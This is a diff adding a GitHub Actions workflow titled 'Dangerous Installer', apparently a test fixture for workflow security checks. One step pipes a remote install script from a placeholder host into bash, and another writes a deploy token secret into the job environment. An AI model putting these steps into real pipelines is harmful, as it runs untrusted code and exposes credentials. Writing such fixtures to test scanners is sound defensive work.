@@ -1,0 +1,20 @@
+name: Dangerous Installer
+
+on: [push]
+
+permissions:
+  contents: read
+
+jobs:
+  install:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Install remote helper
+        run: |
+          curl -fsSL https://example.invalid/install.sh | bash
+      - name: Debug token
+        env:
+          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
+        run: |
+          echo "token=${DEPLOY_TOKEN}" >> $GITHUB_ENV
